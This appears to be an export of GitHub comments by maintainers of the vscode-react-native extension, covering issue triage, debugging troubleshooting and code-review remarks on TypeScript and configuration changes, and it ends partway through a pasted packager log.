extension published. @irtemed88, thanks for detailed instructions, @jrmgx I hope that helped and closing this. Feel free to reopen if you still have any issues w/ setting up debugging.. Just trying to clean up existing issues and looks like this is basically the same as #441 even though react-native version is a bit different. Closing this for now.. @chrischen-melb thanks for contributing. I just added a couple of minor tweaks and left \"device\" parameter untouched, as specifying \"target\": \"device\" is the only way to launch app on device (see https://github.com/Microsoft/vscode-react-native/blob/HEAD/src/debugger/ios/iOSPlatform.ts#L46). @Carpetfizz, thanks for reporting!\nHowever I think that this is more an issue w/ react-native, especially given that you're seeing exactly the same behavior when running react-native run-android from terminal.\nLooking at the debug console output, though, it seems that the debugger being started correctly (see [vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application line) and just waiting for the app to connect (which will never happen since the app has crashed :) ). You can workaround this issue by running debug session from VSCode and then once app terminated, run it manually (just as in case with react-native run-android from terminal) and select 'Debug JS remotely' from app's debug menu on device. After that the app will connect to debugger and the debug session will continue.\n. @mitja13, thanks for reporting.\nWhile the debug console output looks scary in fact this is just a warning message that states that extension wasn't able to determine correct plist file location to use to enable JS debug mode on simulator and hence it's likely the thing that causes issues w/ inactive breakpoints.\nCould you please look into RN debug meny on simulator (after starting debugging from VSCode) and check whether JS debug is enabled and if it isn't - enable it. This will trigger app to reload code and most likely will enable breakpoints.. @carlthuringer, @mostafaeweda, any chance that you would be able to provide a minimal app that reproduces that issue? I suspect it might happen due to specific structure of your iOS project, but I was not able to repro this.. @carlthuringer, @mostafaeweda, closing this. If you're still experiencing the problem feel free to reopen. @EduardJS hello and thanks for letting us know. We haven't heard about any issues with debugging for some time so this might be something new.\nWould you mind creating a separate issue and filing all fields in issue's template to help us diagnose your problem?. Closing this due to https://github.com/Microsoft/vscode-react-native/pull/517 has been implemented. It's now possible to provide any arguments for both \"React Native: Run Android\" command and launch configuration for debugging Android using new config parameter. @terbooter could you please rebase on top of master and re-push this to trigger CI again? Thanks!. @Amurmurmur, @jbreuer95, @Uby501, the fix has been merged into master. I would appreciate if anyone could test it. Thanks. Awesome, thank you guys for testing! I plan to work on releasing new version in a coule of days.. @agrcrobles, thanks for updating the docs! Just a minor question - wouldn't it also require having Flow npm package installed globally (using npm i -g flow-bin)? If so, could you please also mention this?. Thanks!. @matrosov-nikita, could you please take a look?. This has been reviewed intenally, so merging. Thanks, @terbooter and @matrosov-nikita . @Uby501 @hnq90 I think there is a little bit of confusion there - it's possible to point debugger to use specific target device, however it's currently not possible if you invoke 'React-native: Run ios\" command from command palette. Those 2 things use completely different code paths and @hnq90's PR is about the second option, while @Uby501 is talking about the first one, I guess . Implemented in #512, closing. @hnq90 thanks for your contribution and sorry for not responding earlier. I think you can keep it open if you don't mind - we'll evaluate it and may eventually merge as-is or with some changes.\nAs a side note - there is similar PR for Android platform https://github.com/Microsoft/vscode-react-native/pull/452 and looks like specifying particular device for running app on is in-demand feature. However we'd probably need to think over this a bit more to make behavior for different platforms consistent w/ other setting for specifying debug target (https://github.com/Microsoft/vscode-react-native/blob/master/package.json#L203-L206). @hnq90, this PR has been integrated as a part of #512 with some additions. Thanks again for your contribution!. @kirillta, @iainroyle, @lyingd - I guess this issue has the same reason as #470 and #471 - this is confirmed indirectly that all you're using VSCode 1.14 (either stable or insiders). This has been fixed by #472, closing.. LGTM, thanks @iTOYS . @danderson00, thanks for reporting. However ths this doesn't sound like an issue with extension itself - looks like this is known issue with VSCode itself, see https://github.com/Microsoft/vscode/issues/29204 and https://github.com/Microsoft/vscode/issues/28593. Looks like the problem was fixed in 1.14 so upgrading VSCode should help\n. Closing this. @danderson00 if you're still having this problem and feel that this is a problem with extension - please reopen. @aschrijver this issue is not about running/debugging tests for react-native applications (see relevant PR - #468). This is just about this extension's tests. If you're having any troubles with that, please file a separate issue describing your problem.\nAs for loading code from disk rather from packager - this is a thing we can't avoid as we need to process bundle before loading it into Node. However I don't see any negative consequenses of that but if you have any issues - open a new issue and explain your use case so we could try to investigate.\nThanks. @iTOYS Dupe %). Resolved in #506 . @EamonnLaffey this has been addressed in #482. The fix would likely be available in next extension release but you can try build and link it to your extensions folder manually to verify if it works.. @foobar8675 the answer is depends on which version of extension you have :) The actual version is 0.4.2 which has been published about 3 weeks ago. To track releases you can use this repo releases page or refer to changelog . Closing this one in favor of #471 . Resolved in #472 . @iainroyle another option is to clone this repo, build it (gulp build) and then create a symlink to it at ~\\.vscode\\extensions. @myGitHubLxd what react-native -v says in your project's directory?\nAlso from our experience this issue very often caused by some environment issues - see #365. @myGitHubLxd, any news? Are you still experiencing any issues with that?. Closing this due to lack of response. @myGitHubLxd, if you're still experiencing this, feel free to reopen.\nThanks. @LorandP this looks like a dupe of #459 and has been already fixed in #465. @RoJoHub soon :) Sorry for delay guys, we're working on it.\n/cc @panarasi . Closing this as a dupe. @hovox, \"projectRoot\" option serves another purpose - it allows you to specify root or the whole RN app, not it's iOS or Android native part. This is for cases when you have RN app placed in subfolder of the project.\nAs a partial solution for your issue - there is \"iosRelativeProjectPath\" option for launch.json that allows you to specify root of iOS code relative to the project root.. Closing this as this has been implemented in #517 . @adyanced please be patient :) We plan to release it soon. In the meantime if you want to test unreleased version you can take a look at this https://github.com/Microsoft/vscode-react-native/pull/472#issuecomment-315054799 . @nonameolsson thank you very much for your suggestions! We're very excited to hear about new features people would like to see in this extension.\nSome of the features IMO sound very interesting. @panarasi, your thoughts?. @panarasi should it be a separate extension?\nI'd say that some of those suggestions would be a perfect addition to existing debugging experience. e.g. it'd be very handy to have reload app action in command palette and to be able to bind it on hotkey, or for example show a list of available targets (devices/simulators) when \"target\" entry is not specified in debugging configuration.. > Open Android dev menu on emulator/device - Would this be in tasks.json ? I think adding this would be good.\nThis sounds more like a command palette item which would be available when debug session is active\n\nReload app : I think this would be a good addition to the tasks\n\nIMO same as above\nHowever looking at the plugin @nonameolsson mentioned it seems that they can do this kind of magic only for Android devices/emulators - it doesn't work for iOS and I think we'll need to check first if this is doable for iOS\nAs for building debug/release APK or debug/release bundle - those features indeed are more suitable to be added as VSCode tasks. Adding this kind of tasks is pretty straightforward but we might want to add a couple of examples to docs so people could craft their own tasks based on examples.\n\nIMHO, for iOS, this should be something that makes sense as a part of react-native run command\n@panarasi could you please clarify? Did you mean a separate UI that pops up when you call React Native: Run iOS from command pallette? - In that case yes, I agree. Ok, looks like adding command palette actions for dev menu and app reload feasible - at least corresponding API is avaiable in react-native JS runtime. Given that the worker that executes RN JS code is under our control we could probably just invoke corresponding methods at runtime.\n\n@panarasi so what's you thoughts? I suggest to decouple this into 2 separate issues - a feature request to add dev menu + reload actions to command pallette and a task to add VSCode tasks examples into documentation. @lukecwilliams thanks for reporting. This is an issue with documentation we'll need to address. This recipe doesn't seem to be actual anymore since RN on iOS is now able to determine packager URL automagically using jsBundleURLForBundleRoot method(see for example https://github.com/panarasi/ReactNativeTS/blob/master/ios/ReactNativeTS/AppDelegate.m#L21)\nAlso linking relevant PR: https://github.com/Microsoft/vscode-react-native/pull/447. @JonnyLinja thanks for reporting the issue. Looking at the logs it sounds like you don't have JS debugging enabled in your React-native app. Could you please try enabling it by calling RN developer menu (Cmd+Ctrl+Z) and selecting \"Enable JS debugging\" and the restarting the debugging session from VS code?. @JonnyLinja, thanks for confirmation. Blank screen after starting debugging is a known compatibility issue with latest react-native versions. Fix for it has been already merged into master and will be available in next release.\nRegarding Node error - i've seen it before but it was pretty flaky and I wasn't able to catch it. If it reproduces consistently for you please file another ticket and we'll investigate.\nAs for other places where you can post questions - honestly we don't have any special place for that so feel free to open new tickets here :). Ok. I'll close this one as this doesn't seem to require any further actions. Feel free to reopen if you think it needs to stay open though.. @JonnyLinja, thanks for reporting. We just published a new version of extension (0.4.0) - could you please try to update and see if the issue still reproduces?. @JonnyLinja, do you have any updates? Has this been fixed for you after upgrading extension? Though I remember I've seen this before but this was happening quite sporadically I wasn't able to repro this on 0.3.2, 0.4.0 and latest dev versions.. @JonnyLinja I wasn't able to repro this - I have exactly the same versions of everything but still can both start debugging and attach to already running packager without any issues.\nI might be missing something, so could you please post exact and detailed repro steps to make sure I did everything right :)\nThanks . Awesome! Glad that you were able to resolve the problem. Anyway when you see this next time don't hesitate to open a new issue.. https://stackoverflow.com/questions/45520257/ideviceinstaller-i-returns-segmentation-fault-11 - seems like one of issues with ideviceinstaller people are running into. Hey @mark0978, thanks for letting us know about the problems! The issue with reinstalling packages has been fixed in 0.4.0 - we don't try to install Expo's flavor of react-native and just rely on version that is already installed. Could you please try upgrading extension to 0.4.0 - I hope this would resolve this problem.\nAs for problem, described in 2. - this is something that is out of our control. Looks like those messages are being printed by the packager and perhaps they might be caused by RN dependency reinstallation and possibly will be resolved after extension upgrade. If this won't help please let us know and we'll investigate.\n\nIs there some method to just act as the debug agent? Attach to packager doesn't do anything of note, it outputs this error message, which neglects to give the key and section this port would be placed in.\n\nAcknowledged. We definitely need to make this message more descriptive.. @mark0978 - just a friendly ping - have you had a chance to upgrade the extension to see if the problems with reinstalling node_modules are resolved?. @mark0978 any updates?. @mark0978 when you running app in VSCode, how exactly are you doing this? Are you using \"React-native: \" command from command pallette or starting a debugging? If second - which debug configuration are you using?\nThe error message you're seeing in \"output\" window is very similar to what people were seeing in #432 (see https://github.com/Microsoft/vscode-react-native/issues/432#issuecomment-321545063) and likely doesn't meant that there is a \"real\" error - it's there just because we failed to \"prewarm\" packager which is not critical for debugging. However we execute \"prewarming\" only when running react-native apps, not Exponent so it's likely that you just used wrong launch config for running your Expo app.. @mark0978 just a friendly ping. Are you still having any issues? If not I'm going to close this in a couple of days.. Fixed in #493\nThanks for suggestion, Simon (@lydell) - we'll definitely look at rewriting sourcemaps resolution logic to not depend on external components, but in the meantime this patch should unblock Windows users experiencing the issue.. As a general request - please also add a couple of tests to cover this bug. @GollyJer thanks for reporting. In the latest version we improved Expo support and with that version  no any specific actions to debug Expo or CRNA apps required. Could you please upgrade and describe in details what kind of issues you're experiencing?. @GollyJer, this message usually means that the extension wasn't able to activate. Most of the times this happens due to react-native not installed globally (even though this is an Expo project we still require react-native-cli to be installed on machine).\nCould you please check if react-native-cli is installed and post here output of react-native -v inside of your ptoject. @GollyJer, @zimmed guys could you please confirm that react-native-cli is installed globally and let me know about result of react-native -v inside your app?. @GollyJer, @zimmed, guys, if you're still seeing the issue - please confirm that react-native-cli is installed globally and react-native -v inside of your app prints correct version. . @GollyJer Thanks \ud83d\udc4d . @GollyJer thanks for confirmation. This seems to be another issue and original problem with unability to debug Expo app is resolved, so I'm going to close this and create a separate ticket. Could you please take a look at #511 and help me to file missing details? . @boguscoder thanks for reporting. Unfortunately we've never tested this scenario and perhaps it would take some time to craft a repro case unless you don't have an example (maybe some OSS project written in react-native) which we could use.\nAnother point is that not only this extension is involved in dealing with source maps - there are vscode-node2-debug and vscode-chrome-debug-core behind the scenes that might also be causing such aggressive memory consumption\nAnyway this need an additional investigation and I'll let you know once we have any results here.. @boguscoder I tried to repro this with relatively large app (https://github.com/infinitered/ChainReactApp, map size for unminified source ~12 Mb) without any luck.\nBundle load/reload time was quite long but I didn't notice any uncommon resources consumption (one of vscode processes has caused CPU load about ~100% though it then decreased to normal values).\nMemory consumption stayed stable during both bundle load and regular debugging. Here is a pic of how memory load was looking in my case\n\nAny other ideas about reproducing this would be really appreciated \n. @Tonyhark thanks for reporting - I was able to repro this, but an interesting observation is that if you trigger suggestion first (by pressing Ctrl+Space) all available property names are showed in suggestions list - see below\n\nwhich sounds more like an issue with typescript engine that doesn't yield completions under some specific circumstances.\nAlso since we don't manage typings in this extension and completely rely on typescript and VSCode I doubt we can do anything here - I believe that Microsoft/Typescript repository would be a better place to file this issue.. @Tonyhark could you please confirm that you're seeing the same behavior? Also, if there would be no objections I'm going to close this ticket in a couple of days. . @Tonyhark any updates? If you don't have any objections, I'm going to close this. @gino8080 thanks for confirmation. Closing this. @syq7970 thanks for reporting. I confirm that I'm seeing the same. We'll investigate and let you know if any workaround is available. @bgiavotto thanks for update. Actually we also observe the same issue on WIndows and came to the same conclusion. Interesting fact is that I can observe this on Windows but on Mac debugging works smoothly.\nUnfortunately I can't propose any workaroung for now. In the meantime I'm going to look into RN Android native code to try to find where the problem might come from.. Hi @bgiavotto, not yet unfortunately. I plan to investigate this first to find out the real reason as looking at similar react-native issues (including one that you have created - https://github.com/facebook/react-native/issues/15298) no body have an idea what's happening and why debugging stuck.. Upd. There is also a PR that mentions the same problem - https://github.com/facebook/react-native/pull/13116 - however i'm hot sure if it would fix the issue. Resolved by #507 . /cc @iTOYS . Okay, closing this as it has been already fixed #507 and will be available in next release. @GollyJer, sorry for late response - yes, we plan to release new version this week. Stay tuned :). @GollyJer, just published a new version - please try it out ;-). @iTOYS, could you please also add a notice to https://github.com/Microsoft/vscode-react-native#setup-debug-environment section explaining that it will also respect simulator/device configuration from settings.json in case if \"target\" is not specified. Otherwise LGTM \ud83d\udc4d . Thanks for reporting @shoegazerwithak. Unfortunately as I mentioned in #499 this is likely an issue with typescript engine that doesn't yield completions under some specific circumstances.\nAlso since we don't manage typings in this extension and completely rely on typescript and VSCode I doubt we can do anything here - I believe that Microsoft/Typescript repository would be a better place to file this issue.. I'm going to close this one - feel free to reopen if you think that this is a problem with this extension. @jwargo thanks for review and your edits!. @iTOYS PTAL^ . @JohannBlake could you please elaborate how is this connected to this extension? Looking at your debug configuration this seems to be more related to node debugger from VSCode.. Nevermind, I'll close it. LGTM. @j2l, thanks for reporting\nIntellisense for ReactNative is not controlled by this extension anymore and I afraid that README instructions regarding setting it up are mostry irrelevant. Ideally since Intellisense for JSX provided by VSCode typescript engine it should work out-of-the box even if you don't have this extension installed.\nOne of ideas apart from the bug in either VSCode or TS engine, this might be possibly caused by other installed extensions (I see that you have 2 extensions for Flow installed) conflicting with tsserver or adding some configurations, preventing typescript engine to provide completions. Can you please try disabling those and see if it helps?\nAlso since we don't manage typings in this extension and completely rely on typescript and VSCode I doubt we can do anything here - I believe that Microsoft/Typescript repository would be a better place to file this issue.. Closing as per internal discussion - instead of just adding some prefixes we'd need to use separate channels for packager build and debug logs. @iTOYS PTAL. This has been integrated as a part of #526 . Hello @alexisbg. Just to clarify - are you describing the scenario when packager runs on your Linux VM whether VSCode and Android app (in emulator) on local Windows machine?. Unfortunately I don't hink we currently support this scenario, however in theory this might work if we add a way to configure packager host to connect debugger to. Remote root property in that case would be required to properly map remote sources to local, e.g. for setting breakpoints and other debugger features.\n@jwargo, what do you think?. Adding this to our backlog. @EduardJS thanks.\nIt looks like debugger runtime is getting started but not receiving any signal from RN app to start debugging. A first thing that comes into my mind - you probably have JS debugging disabled on simulator. Could you please try invoking dev menu on simulator, check if JS debugging is enabled and if not - enable it and let me know if it would help.. @EduardJS, the reason why it's non mentioned in docs is because the extension should enable it automatically in case of simulator. So actually I think this is a bug - I'll reopen this and we will try to reproduce and investigate. Okay, I completely forgot that I have already merged #510 that has a fix, so I'm goingto close this. @tafelito, sorry, I do not work on this anymore - probably either @max-mironov or @annakocheshkova would be able to help. Fixed in #532 . @DonkeyTronKilla thanks for reporting, but the problem doesn't seem to be caused to this extension - we now completely rely on VSCode for JSX IntelliSense\nHowever looking at developer console I strongly suspect that the problem might be caused by another extension. To diagnose that could you please try temporarily disabling suspicious ones (I suggest you to try those 2 which produce most of errors in dev console) and reload/restart VSCode to see if it helps . @kulmajaba Thanks for reporting, we already looking into this. @vettukal ${workspaceRoot}/.vscode/launchReactNative.js doesn't need to exist - IIRC this entry was required to be specified due to some VSCode debug protocol limitation, when launch configuration must contain \"program\" property, but react-native debugger doesn't use it anyway. @iTOYS - we might want to revisit this to see if it's still required.\nRegarding running app and attachning to packager - those two lines\n[vscode-react-native] Debugger worker loaded runtime on port 35151\nEnsure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the tar\n\nare likely saying that Node failed to run bundled JS code perhaps because of some issues with JS which compiles fine but then crashes at load time. @vettukal can you double check that the app is running fine in debug mode without VSCode (i.e. in Chrome)?\nFor running CRNA app in Expo - @iTOYS, were you able to repro it?\n. @cptmcnugget by default intellisense is provided by TypeScript engine within VSCode so presence of .flowconfing doesn't matter. To use Flow for IntelliSense instead of TypeScript you need to follow this recipe but i'm not sure if it would help in this particular case though.\nRegarding the root of the problem - there seem to be a bug in tsserver which doesn't return any completions for Styles members when completion triggered after typing a few characters of member name, hovewer if you press \"Ctrl+Enter\" before typing a style's member name VSCode yields a list of completions\n. @cptmcnugget to develop RN app in Javascript you  don't need Typescript installed as VSCode uses bundled Typescript engine.. So much legacy stuff has finally been wiped out. Woohoo!! Glad you guys did that! :). @MSLaguana, updated in 8f87e13\n. Yep, it works. I was using this launch task to debug nodeDebugWrapper. Also, the official documentation on node debugging suggests that \"program\" points to .js file, but I've seen a lot of examples where .ts file is used directly as a program to launch.\n. So, actually the goal of this change was to use reactNativeDebugEntryPoint rather than nodeDebugWrapper to run and attach debugger to, js -> ts is not necessary, so i can switch this back to using generated js.\nAlso this doesn't directly related to the bug this PR fixes so i'm not sure if this should be included in this PR. Pls. let me know if i need to submit a separate PR with this change.\n. Technically it's correct, though we can put this file into subfolder rather than to the project root - tsserver understansds both locations.\n. Done!. This is a path, relative to workspace's root, right? Could you please make it more clear?. You might want to use strip-json-comments to make it parseable. You don't need to check if path is absolute - path.resolve(vsCodeRoot, projectRootPath) would yield back projectRootPath if it's absolute, despite of what is in vsCodeRoot. Nit: If the only purpose of setProjectRoot is to set this.projectRootPath, IMO it'd be more transparent and readable to make a function that would return projectRootPath, and use it's result.. Great idea! I totally missed that fact with require override by react. Yeah, there should be a reasoning why we have to use real script file to test importScripts. I'll update.. I think that previously the timeout was required just to delay dispatching the current promise chain and let scriptImportDeferred chain to be dispatched first.\nIn this implementation the spawned process is a black box and completely async for us so we can't reliably determine when the script has been imported and executed, so the only way to test this IMO is to give some reasonable amount of time to worker to complete script's import before checking if it has been done.\nAs for race conditions - not sure where are they might happen. Every test spawns it's own worker, so they are isolated from each other.. option in launch.json -> option to launch.json. I think this meteor mapping is excessive. It's present in default mappings but is nor required for this particular case. Could you please remove it. I think it'd be better to reword to \"See more about source map overrides here\". Please provide more detailed description instead of just showing a link. Description field renders to a popup which doesn't support interacting with links hence this link will be useless as user would not be able to click on it. You might want to just copy the description from the corresponding entry of node2 debugger. Do we need this change? Why you would use regexp replacement rather than path methods?. I think this might be slightly simplified - you don't need to check if path is absolute and feed such paths to updateSourceMapPath because path.resolve recognizes this. In general this might look like\nreturn IS_REMOTE(source) ? source : updateSourceMapPath(source)\nsee also https://github.com/Microsoft/vscode-react-native/commit/954784f343d73ace8fbffd7709e71781edecbdeb#diff-2f0685a608d83df323d5af2332f36d95 for example. This JSDoc doesn't reflect method's functionality anymore. Could you please update. Actually after rethinking this a bit I propose just to test whether sourcePath is remote URL and skip update in this case, and in all other case just feed it into update. I feel that rewriting paths becomes too complicated and probably needs a complete rewrite, probably leveraging new node2-debug features (such as remapping). @iTOYS is it really required to spawn cli.js directly rather than via react-native-cli? . \ud83d\udc4d . any -> string[]. Are name and slug required? IIRC CRNA app doesn't have them defined in package.json. Please don't use , to join CLI arguments. The common practice is to delimit using just space. any -> XDLPackage ?. same here. ... and here .... and everywhere else.. I don't think you can just change signature here.workspaceRootPath and projectRootPath have different meanings. Please consult https://github.com/Microsoft/vscode-react-native/pull/359 for implementation details. Nit Next time please avoid changes like this. It's a good idea to improve code style but it's better to address in separate commit/PR along with enforcing code style rules in project settings. For these two lines please see my comment to rn-extension.ts and https://github.com/Microsoft/vscode-react-native/pull/359. Please don't use string replace to normalize paths. Use path.posix.join instead. I'm curious why is it really required to use generics? Semantically I'd rather return any and then cast result to expected type\n. Instead of checking some predefined \"magic\" locations you might want to look at \"main\" entry in package.json. I ddn't find any documentation but from my experience it always points to the main entry point. Also note the case when for example \"main\" points to non-existent file - in that case you'll need to check for ios and adroid variants of that file, i.e.\nindex.js (doesn't exist) -> index.ios.js / index.android.js. I can't find `.catch` for this. What happens if neither `app.json` nor `exp.json` exists. Packager, you meant. Anyway, this call is effectively has the same result as `this.spawnChildProcess(reactCommand, this.combineArguments(command, args), options)`  so I wonder if the change was really required.. _It shouldn't contain anything other than strings_ - semantically `args` is an array of parameters passed to the packages and commandline parameters are always strings.\n\nThe line that you pointing me to (args.push(\"--assetExts\", [\"ttf\"])) is also very confusing and probably would look better if rewritten to args.push(\"--assetExts\", [\"ttf\"].toString())\nAnother argument is that I perfectly remember that you've had a lot of troubles you could avoid if array value was converted to string explicitly. Ok, makes sense. My bad, should be typeof XDLPackage. I can see at least one code path where the exception here will not be caught by caller code which likely would lead to extension crash - this is a bad UX and must be avoided if possible.\nHave you tested this scenario?. Ok, It appears that path.join would not correct path separators.\n. You might want to check if the filePath is an ablolute path - in this case you'd broke it. Yes, now it works that way, but I can imagine that when urix transitive dependency (which has the bug we're trying to workaround) gets updated we'd run into trouble which we could avoid by adding just one additional check. Pls rename stub -> fsReadFileStub. DISK -> DISK_LETTER_RE. Though this is correct expression, it's semantically incorrect to \"return log warning\". Let's change this to a single return on a separate line;. Can you explain what IRemoteExtensionOptAndroid stands for? I was thinking about this object as a set of dependencies for Android platform class so I would call it AndroidPlatformDependencies or AndroidPlatformDeps. What do you think?. Thil line looks erroneous - probably need to add return here . I'm not sure if you need to change return type to any - there are 2 calls of promptForInformation below and they both are expected to return string.. I think it's better to make exponentTunnelPath of type string | null instead of adding a special case -\n empty string - meaning that we don't have tunnel URL yet.. Similar to https://github.com/Microsoft/vscode-react-native/pull/507/commits/8746e73e9a266e143e4e6523182c14abcaac8112#diff-e9dfe93688b8c06ddeede6d1a262f7d5R68 I suggest you to rename this to MobilePlatformDeps or MobilePlatformDependencies. Notice that there were a special check for  null result in https://github.com/Microsoft/vscode-react-native/pull/507/commits/8746e73e9a266e143e4e6523182c14abcaac8112#diff-5035cee3ccc48909f0ba478f87670719R57 so you probably can't just reject here  - you'll need to make sure this rejection is handled correctly in findPListFile method. I think it's still better to return null in case of success and change function's return type instead. Can't see any reason for changing void -> any. Extension compiles even without this change . Using \"\" as default value for platform might cause problems in https://github.com/Microsoft/vscode-react-native/pull/507/commits/8746e73e9a266e143e4e6523182c14abcaac8112#diff-328d76ec2ff0f7b1ba655f2d9de8761dR149 - this will infer incorrect bundle file name and prewarm will fail. I suggest to make platform parameter optional and check if it's defined later. Using \"\" as a default value will cause nect call (TargetPlatformHelper.getTargetPlatformId(platformName)) to throw so this is basically useless . Looks like these two variables are being assigned but not being used afterwards - can we just remove them?. Please return void 0 explicitly instead of returning Log.logMessage. I think you can't use \"\" as default value here. What downloadAppScript will download in that case?. Please don't return object with empty fields - return null instead. This behavior is a) clearly explained in JSDoc and b) is expected by the code that calls getSourceMapURL. By returning empty object you will for example cheat this check https://github.com/Microsoft/vscode-react-native/pull/507/commits/8746e73e9a266e143e4e6523182c14abcaac8112#diff-80517b8ebea1fc8b9eba0038af0d95bbL42. I'd avoid type cast here and instead update the code below to respect the fact that all tsPosition properties are nullable. Please return Promise(void) explicitly. Please don't change the return type of this method - there is a check in intellisenseHelper that checks tsdk value against null (https://github.com/Microsoft/vscode-react-native/blob/master/src/extension/intellisenseHelper.ts?utf8=%E2%9C%93#L199). I think you still need this line - this dir is created each time after running npm test. Oh, missed that line, sorry :). Yep, sorry. Didn't notice that you re using this notation. You might also want to add this field to one/all snippets in configurationSnippets section, so every new configuration would have this field set up, just to make sure that people would see and use it :). You might want leverage \"enum\" property to define avaiable values\n\nSee https://spacetelescope.github.io/understanding-json-schema/reference/generic.html#enumerated-values. For the sake of readability consider splitting this into a multiline expression :). Instead of string literal can you use IOSPlatform.simulatorString?. Please split this line into multiple ones. Latest RN throws an error in case if device name is missing:\nrn run-ios --device\nScanning 578 folders for symlinks in /Users/kotikov.vladimir/sandbox/baz/node_modules (20ms)\nFound Xcode project baz.xcodeproj\nCould not find device with the name: \"true\".\nChoose one of the following:\nThis might be a bug in RN or an intended behavior, in either case it might make sense to either warn user about this and stop operation or try enumerating available devices (using ios-deploy --detect) and choose the first one, for example.\n@iTOYS what do you think?. Might want to use more strict type here, e.g. \"simulator\" | \"device\". typo \"invelid\" => \"invalid\". You would need to add a notice that if available, arguments for running app will be read from .vscode/settings.json and the 'target' will affect on whether we will run app on device/emulator. Let's make a soft deprecation and remove this gradually. I suggest to keep this option for now but change its description to notice that it's being deprecated and will be removed and suggest using new runArgs option, in the next release we will remove if from launch.json and in next after that - remove it completely from the code.\nWhat do you think?. Can we expose it as react-native.android.runArgs.simulator rather than react-native.android.simulator.runArgs similar to former 'launchTarget' option?\nAlso IMHO runArgs doesn't sound well - it's convenient to use in code but in configuration file shortening names is not necessary and IMO decreases readability of config file. Yeah, I saw that. I just meant that we might want to keep this option available for launch.json but change it's description to emphasize its deprecation. Path should be \"../src/extension/openFileAtLocation\". Shouldn't we just remove \"out\" from everywhere? . I believe you still need to ignore the whole src directory apart from js files. IMO the correct pattern is\nsrc\n!src/**/*.js. Why ignore out if we don't put any files there? . \ud83d\udc4d . Same here - why should we ignore \"out\" . This line uses tabs instead of spaces - please update. Yup, fixed. Not ignoring whole src dir basically means that all source ts files will appear in final vsix package. I don't think this is expected behavior. You might also want to add *.map files to exclude. This will become non-actual once this brach is merged into master, but I'm fine with leaving this as-is for now. There is some redundancy here - console.assert will throw an AssertionError even before the execution could reach this default case. In general passing value other than CommandStatus.Start or CommandStatus.End is impossible and will break compilation since CommandStatus enum doesn't contain any other members. This doesn't seem to be used anywhere. Is there any sense in returning promise instead of void? . Could you please explain a bit more why it's required to save it into local variable?. Yes, please \ud83d\udc4d . Nit: having a class holding just one static method is redundant - consider exporting just one function. What do you think about returning (IRemoteExtension)rpc.Client(ws).api().Extension where IRemoteExtension is a shared interface with all required methods implemented by ExtensionServer. In that case you could avoid wrapping _api's methods calls. Indentation here is inconsistant - please use 4 spaces. Nit: why not just global.require('NativeModules').DevMenu.show();. I think this is a logic error - even if onmessage is falsy you still need to check message against vscodeHandlers, i.e. \njs\nif (message.data && vscodeHandlers[message.data.method])\n    ... call handler\nelse if (onmessage)\n    ... call onmessage. Please correct indentation here. Nit: I'd suggest to keep Adb name to a) avoid redundant renaming and b) reflect that this is just an abstraction over adb . Instead of your own chaining logic you could simply leverage Array.reduce (see https://github.com/kriskowal/q#sequences), e.g. \njs\nreturn commands.reduce((promise, command) => {\n    return promise.then(() => this.commandExecutor.execute(command));\n}, Q(void 0));. Nit: instead of repeating this lazy initialization twice maybe just create a private getter for this.remoteExtension?. ",
    "iTOYS": "No longer relevant. Hi @joshuaskelton,\nPlease see https://github.com/Microsoft/vscode-react-native/blob/master/doc/intellisense.md. Hi @careergod \nPlease see this issue in react-native repo.\nSeems like there is some problems with android adb. Hello, @bochen2014 \nAttach to packager configuration available in default launch.json\nYou can re-initialize your launch.json if will delete current and click gear icon\nDefault Attach to packager configuration here:\n{\n    \"name\": \"Attach to packager\",\n    \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n    \"type\": \"reactnative\",\n    \"request\": \"attach\",\n    \"sourceMaps\": true,\n    \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n }. Yep, we've added support for port customizing here #536\nWill be available in new release.. Hi @Jarrio \nCould you please restart your vscode after added setting and then check again?\nThanks!. Ok! @svekl could you please try it?. http://blog.nparashuram.com/2016/08/time-travel-debugging-with-reactnative.html\nhttps://gist.github.com/axemclion/ee760a748bd6390d0f3540ea0c292caf. Great decision! \ud83d\ude03 . I tried to reproduce this issue, but i haven't had this problem.\nmacOS Sierra 10.12.5\nVSCode 1.13.1\nExtension  0.3.2\nNode v8.1.3\nXcode 8.3.3\nApp was initialized with:\nreact-native init AwesomeProject --version=react-native@0.45.0\n@Amurmurmur @zeflash \nPlease, can you make some example app for this case?. @Uby501 you are right, debugger was disabled, reproduced now.\nThanks!. Hello, @iShawnWang \nCould you open a new issue and fill it up with a template.\nThanks!. @aschrijver \nThis issue about extension's self-tests. . Hi @christ776\nDid you run npm install in extension folder before?. Hello @nonameolsson\nWe've implemented Reload App and Open Dev Menu command palette commands for Android and iOS.\nIf you want, you could test it, by installing extension from master(instruction). \nNew release will be a bit later.\nThanks!. @nonameolsson Thanks!\nLet me know of results. Any suggestions are welcome!. @nonameolsson \nThere some problems with iOS, but i'm going to think about it.. This works for all devices which adb devices command return;. Implemented in #544 #549. Problem with our dependencies https://github.com/lydell/source-map-resolve/issues/9. Fixed in https://github.com/Microsoft/vscode-react-native/commit/5c8365a68f95fcc6792e2d26a4303d8c5fc7dc23#diff-ccd5d2e3d6201ee161bc408336a8bfb7R117. Hi @SrikanthKabadi \nI've create issue for that #567 . @vladimir-kotikov please have a look. @vladimir-kotikov PTAL. \ud83d\udc4d . Hi @callagga \na) Yes.\nb) Go to FILE - PREFERENCES - SETTINGS, then select \"Workspace Settings\" in dropdown menu(or create settings.json file in \".vscode/\" folder) and then add above-mentioned config\nI plan to release a new version later this week! Thanks!. Hi @callagga,\nCurrent version is 0.5.2. Hi @vettukal!\nPlease try this extension for debugging react-native.\nAnd let me know if this works for you.\nThanks!. @vettukal \nWhat version of react-native do you use?\nCould you please run app in terminal with react-native run-ios --simulator and if it run, try attach\nLooks like that issue https://github.com/facebook/react-native/issues/11293\nAlso, could you please try react-native init app. Hello @vettukal \nAny updates?. @vladimir-kotikov @vettukal \nI can't reproduce that.\nAll works fine with CRNA app and react-native-tools@0.4.2\n```\nGetting exponent dependecy.\nDependency not present. Installing it...\n### Making sure your project uses the correct dependencies for exponent. This may take a while...\nChecking if this is Expo app......\n.......................\n### Starting Packager\n### Executing command: react-native.cmd start --port 8081 --root .vscode --assetExts ttf\nScanning 768 folders for symlinks in c:\\projects_test\\CRNA\\node_modules (26ms)\n 